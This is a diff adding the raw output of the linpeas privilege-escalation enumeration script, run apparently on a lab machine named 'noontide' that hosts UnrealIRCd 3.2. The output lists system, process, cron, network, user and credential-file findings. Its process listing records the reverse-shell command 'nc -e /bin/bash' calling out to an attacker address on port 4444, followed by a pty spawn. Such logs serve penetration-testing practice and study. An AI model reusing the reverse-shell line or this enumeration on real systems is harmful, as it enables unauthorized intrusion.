@@ -1,0 +1,1205 @@
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+════════════════════════════════════╣ Basic information ╠════════════════════════════════════
+OS: Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)
+User & Groups: uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+Hostname: noontide
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories using 1 threads DONE
+
+════════════════════════════════════╣ System Information ╠════════════════════════════════════
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 10 (buster)
+Release:	10
+Codename:	buster
+
+[+] Sudo version
+sudo Not Found
+
+[+] USBCreator
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/bin:/bin
+New path exported: /usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
+
+[+] Date
+Sat 08 May 2021 01:10:55 PM EDT
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+udev            479M     0  479M   0% /dev
+tmpfs            99M  4.2M   95M   5% /run
+/dev/sda1       6.9G  1.5G  5.1G  23% /
+tmpfs           494M     0  494M   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           494M     0  494M   0% /sys/fs/cgroup
+              total        used        free      shared  buff/cache   available
+Mem:        1009964       75844      716604        4280      217516      758804
+Swap:       1046524           0     1046524
+
+[+] CPU info
+Architecture:        x86_64
+CPU op-mode(s):      32-bit, 64-bit
+Byte Order:          Little Endian
+Address sizes:       43 bits physical, 48 bits virtual
+CPU(s):              1
+On-line CPU(s) list: 0
+Thread(s) per core:  1
+Core(s) per socket:  1
+Socket(s):           1
+NUMA node(s):        1
+Vendor ID:           AuthenticAMD
+CPU family:          23
+Model:               1
+Model name:          AMD EPYC 7371 16-Core Processor
+Stepping:            2
+CPU MHz:             3094.187
+BogoMIPS:            6188.37
+Hypervisor vendor:   VMware
+Virtualization type: full
+L1d cache:           32K
+L1i cache:           64K
+L2 cache:            512K
+L3 cache:            65536K
+NUMA node0 CPU(s):   0
+Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+SHLVL=2
+HOME=/home/server
+LOGNAME=server
+_=./linpeas.sh
+TERM=xterm
+PATH=/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
+LANG=en_US.UTF-8
+HISTSIZE=0
+SHELL=/bin/sh
+HISTFILE=/dev/null
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a virtual machine? ..... Yes (vmware)
+[+] Is this a container? ........... No
+[+] Any running containers? ........ No
+
+
+═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+sda5
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+UUID=018b8bb5-3d4f-4d1f-808e-9c6dfcc0cfa3 /               ext4    errors=remount-ro 0       1
+UUID=e1f4d139-b1f6-422b-8eb9-9c832e11f6c3 none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+/dev/sr1        /media/cdrom1   udf,iso9660 user,noauto     0       0
+
+
+════════════════════════════════════╣ Available Software ╠════════════════════════════════════
+[+] Useful software
+/usr/bin/nc
+/usr/bin/netcat
+/usr/bin/nc.traditional
+/usr/bin/wget
+/usr/bin/ping
+/usr/bin/gcc
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/python3
+/usr/bin/python3.7
+/usr/bin/perl
+
+[+] Installed Compiler
+ii  gcc                           4:8.3.0-1                           amd64        GNU C compiler
+ii  gcc-8                         8.3.0-6                             amd64        GNU C compiler
+/usr/bin/gcc
+
+
+══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+root         1  0.0  0.9 103716 10028 ?        Ss   12:51   0:00 /sbin/init
+root       248  0.0  0.7  40388  7828 ?        Ss   12:51   0:00 /lib/systemd/systemd-journald
+root       268  0.0  0.5  22196  5136 ?        Ss   12:51   0:00 /lib/systemd/systemd-udevd
+systemd+   378  0.0  0.6  93084  6468 ?        Ssl  12:51   0:00 /lib/systemd/systemd-timesyncd
+  └─(Caps) 0x0000000002000000=cap_sys_time
+root       380  0.0  1.0  48220 10580 ?        Ss   12:51   0:00 /usr/bin/VGAuthService
+root       381  0.0  1.1 122584 12004 ?        Ssl  12:51   0:00 /usr/bin/vmtoolsd
+root       398  0.0  0.2   8504  2580 ?        Ss   12:51   0:00 /usr/sbin/cron -f
+message+   399  0.0  0.3   8688  3576 ?        Ss   12:51   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root       401  0.0  0.5  19768  5180 ?        Ss   12:51   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root       403  0.0  0.4 225824  4284 ?        Ssl  12:51   0:00 /usr/sbin/rsyslogd -n -iNONE
+root       404  0.0  0.6  19308  6400 ?        Ss   12:51   0:00 /lib/systemd/systemd-logind
+server     425  0.0  0.4   5568  4404 ?        S    12:51   0:00 /home/server/irc/Unreal3.2/src/ircd
+server    1035  0.0  0.0   2388   760 ?        S    13:05   0:00  _ sh -c AB;nc -e /bin/bash 192.168.49.117 4444 dwtxezmgp
+server    1036  0.0  0.3   6644  3152 ?        S    13:05   0:00      _ bash
+server    1039  0.0  0.8  16872  8420 ?        S    13:06   0:00          _ python3 -c import pty;pty.spawn('/bin/bash')
+server    1040  0.0  0.3   6992  3692 pts/0    Ss   13:06   0:00              _ /bin/bash
+server    1057  0.0  0.1   2728  2004 pts/0    S+   13:10   0:00                  _ /bin/sh ./linpeas.sh
+server    1694  0.0  0.0   2728   452 pts/0    S+   13:10   0:00                      _ /bin/sh ./linpeas.sh
+server    1698  0.0  0.3  10780  3136 pts/0    R+   13:10   0:00                      |   _ ps fauxwww
+server    1697  0.0  0.0   2728   452 pts/0    S+   13:10   0:00                      _ /bin/sh ./linpeas.sh
+root       520  0.0  0.1   5612  1716 tty1     Ss+  12:52   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
+root       971  0.0  0.2   5344  2284 ?        Ss   12:56   0:00 /usr/sbin/anacron -d -q -s
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+lrwxrwxrwx 1 root root       4 Aug  8  2020 /bin/sh -> dash
+-rwxr-xr-x 1 root root 2810744 Aug  8  2020 /home/server/irc/Unreal3.2/src/ircd
+-rwxr-xr-x 1 root root  145488 Apr 27  2020 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root  231560 Apr 27  2020 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root   55360 Apr 27  2020 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root  678392 Apr 27  2020 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root   64744 Jan 10  2019 /sbin/agetty
+lrwxrwxrwx 1 root root      20 Apr 27  2020 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root 2851888 Mar 24  2020 /sbin/wpa_supplicant
+-rwxr-xr-x 1 root root  240680 Jul  5  2020 /usr/bin/dbus-daemon[0m
+-rwxr-xr-x 1 root root  131360 Oct  9  2019 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root root   56808 Oct  9  2019 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root   34832 May 19  2019 /usr/sbin/anacron
+-rwxr-xr-x 1 root root   55792 Oct 11  2019 /usr/sbin/cron
+-rwxr-xr-x 1 root root  702096 Feb 26  2019 /usr/sbin/rsyslogd
+
+[+] Files opened by processes belonging to other users
+[i] This is usually empty because of the lack of privileges to read other user processes information
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 Not Found
+sshd Not Found
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+/usr/bin/crontab
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+@reboot /home/server/irc/Unreal3.2/unreal start
+incrontab Not Found
+-rw-r--r-- 1 root root 1042 Oct 11  2019 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x  2 root root 4096 Aug  8  2020 .
+drwxr-xr-x 67 root root 4096 Dec  3 11:21 ..
+-rw-r--r--  1 root root  285 May 19  2019 anacron
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.daily:
+total 36
+drwxr-xr-x  2 root root 4096 Aug  8  2020 .
+drwxr-xr-x 67 root root 4096 Dec  3 11:21 ..
+-rwxr-xr-x  1 root root  311 May 19  2019 0anacron
+-rwxr-xr-x  1 root root 1478 May 28  2019 apt-compat
+-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
+-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
+-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug  8  2020 .
+drwxr-xr-x 67 root root 4096 Dec  3 11:21 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x  2 root root 4096 Aug  8  2020 .
+drwxr-xr-x 67 root root 4096 Dec  3 11:21 ..
+-rwxr-xr-x  1 root root  313 May 19  2019 0anacron
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x  2 root root 4096 Aug  8  2020 .
+drwxr-xr-x 67 root root 4096 Dec  3 11:21 ..
+-rwxr-xr-x  1 root root  312 May 19  2019 0anacron
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+HOME=/root
+LOGNAME=root
+
+1	5	cron.daily	run-parts --report /etc/cron.daily
+7	10	cron.weekly	run-parts --report /etc/cron.weekly
+@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+@reboot /home/server/irc/Unreal3.2/unreal start
+
+[+] Services
+[i] Search for outdated versions
+ [ + ]  anacron
+ [ + ]  apparmor
+ [ - ]  bluetooth
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ + ]  dbus
+ [ - ]  hwclock.sh
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ + ]  networking
+ [ + ]  open-vm-tools
+ [ + ]  procps
+ [ + ]  rsyslog
+ [ + ]  udev
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
+Sun 2021-05-09 00:00:00 EDT  10h left Sat 2021-05-08 12:53:44 EDT  17min ago    logrotate.timer              logrotate.service
+Sun 2021-05-09 01:43:19 EDT  12h left Sat 2021-05-08 12:53:44 EDT  17min ago    apt-daily.timer              apt-daily.service
+Sun 2021-05-09 06:05:08 EDT  16h left Sat 2021-05-08 12:53:44 EDT  17min ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sun 2021-05-09 13:06:28 EDT  23h left Sat 2021-05-08 13:06:28 EDT  4min 29s ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                          n/a      Sat 2021-05-08 12:56:28 EDT  14min ago    anacron.timer                anacron.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
+  <policy group="lp">)
+Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
+:1.0                                     1 systemd         root             :1.0          init.scope                -          -
+:1.1                                   378 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -
+:1.2                                   401 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+:1.3                                   404 systemd-logind  root             :1.3          systemd-logind.service    -          -
+:1.54                                 5610 busctl          server           :1.54         cron.service              -          -
+fi.epitest.hostap.WPASupplicant        401 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+fi.w1.wpa_supplicant1                  401 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+org.bluez                                - -               -                (activatable) -                         -
+org.freedesktop.DBus                     1 systemd         root             -             init.scope                -          -
+org.freedesktop.hostname1                - -               -                (activatable) -                         -
+org.freedesktop.locale1                  - -               -                (activatable) -                         -
+org.freedesktop.login1                 404 systemd-logind  root             :1.3          systemd-logind.service    -          -
+org.freedesktop.network1                 - -               -                (activatable) -                         -
+org.freedesktop.resolve1                 - -               -                (activatable) -                         -
+org.freedesktop.systemd1                 1 systemd         root             :1.0          init.scope                -          -
+org.freedesktop.timedate1                - -               -                (activatable) -                         -
+org.freedesktop.timesync1              378 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -
+
+
+═══════════════════════════════════╣ Network Information ╠════════════════════════════════════
+[+] Hostname, hosts and DNS
+noontide
+127.0.0.1	localhost
+127.0.1.1	noontide
+
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+nameserver 192.168.117.254
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+default		0.0.0.0
+loopback	127.0.0.0
+link-local	169.254.0.0
+
+ens256: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.117.120  netmask 255.255.255.0  broadcast 192.168.117.255
+        inet6 fe80::250:56ff:febf:b12f  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:bf:b1:2f  txqueuelen 1000  (Ethernet)
+        RX packets 1700  bytes 452329 (441.7 KiB)
+        RX errors 0  dropped 2  overruns 0  frame 0
+        TX packets 1327  bytes 82399 (80.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 28  bytes 2600 (2.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 28  bytes 2600 (2.5 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         192.168.117.254 0.0.0.0         UG    0      0        0 ens256
+link-local      0.0.0.0         255.255.0.0     U     1000   0        0 ens256
+192.168.117.0   0.0.0.0         255.255.255.0   U     0      0        0 ens256
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.117.254          ether   00:50:56:9f:df:ab   C                     ens256
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:8067            0.0.0.0:*               LISTEN      425/ircd            
+tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      425/ircd            
+tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      425/ircd            
+
+[+] Can I sniff with tcpdump?
+No
+
+
+════════════════════════════════════╣ Users Information ╠════════════════════════════════════
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+
+[+] Do I have PGP keys?
+gpg Not Found
+netpgpkeys Not Found
+netpgp Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
+/proc/sys/kernel/yama/ptrace_scope is enabled (0)
+gdb wasn't found in PATH
+
+[+] Checking doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+root:x:0:0:root:/root:/bin/bash
+server:x:1000:1000:server,,,:/home/server:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=101(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
+uid=105(avahi-autoipd) gid=112(avahi-autoipd) groups=112(avahi-autoipd)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 13:10:57 up 19 min,  0 users,  load average: 0.16, 0.03, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+reboot   system boot  Mon Dec 21 07:46:46 2020   still running                         0.0.0.0
+
+wtmp begins Mon Dec 21 07:46:46 2020
+
+[+] Last time logon each user
+Username         Port     From             Latest
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+
+═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════
+[+] MySQL version
+mysql Not Found
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+ Not Found
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Moodle config.php files
+config.php inside a moodle folder Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+mongo binary Not Found
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+rsyncd.conf Not Found
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+ldap Not Found
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+[+] Searching Keyring files
+Keyring folder: /usr/share/keyrings
+/usr/share/keyrings:
+total 132
+-rw-r--r-- 1 root root  8132 Apr 23  2019 debian-archive-buster-automatic.gpg
+-rw-r--r-- 1 root root  8141 Apr 23  2019 debian-archive-buster-security-automatic.gpg
+-rw-r--r-- 1 root root  2332 Apr 23  2019 debian-archive-buster-stable.gpg
+-rw-r--r-- 1 root root  5106 Apr 23  2019 debian-archive-jessie-automatic.gpg
+-rw-r--r-- 1 root root  5115 Apr 23  2019 debian-archive-jessie-security-automatic.gpg
+-rw-r--r-- 1 root root  2763 Apr 23  2019 debian-archive-jessie-stable.gpg
+-rw-r--r-- 1 root root 48747 Apr 23  2019 debian-archive-keyring.gpg
+-rw-r--r-- 1 root root 23889 Apr 23  2019 debian-archive-removed-keys.gpg
+-rw-r--r-- 1 root root  7443 Apr 23  2019 debian-archive-stretch-automatic.gpg
+-rw-r--r-- 1 root root  7452 Apr 23  2019 debian-archive-stretch-security-automatic.gpg
+-rw-r--r-- 1 root root  2263 Apr 23  2019 debian-archive-stretch-stable.gpg
+
+[+] Searching Filezilla sites file
+
+[+] Searching backup-manager files
+
+[+] Searching uncommon passwd files (splunk)
+
+[+] Searching GitLab related files
+
+
+[+] Searching PGP/GPG
+PGP/GPG software:
+gpg Not Found
+netpgpkeys Not Found
+netpgp Not Found
+
+[+] Searching vim files
+
+[+] Checking if containerd(ctr) is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
+
+[+] Checking if runc is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
+
+[+] Searching docker files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
+
+[+] Interesting Firefox Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
+
+[+] Interesting Chrome Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
+
+[+] Autologin Files
+
+
+
+[+] S/Key authentication
+
+[+] YubiKey authentication
+
+[+] Passwords inside pam.d
+
+[+] FastCGI Params
+
+
+[+] SNMPs
+
+
+
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+strace Not Found
+-rwsr-xr-x 1 root root       10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
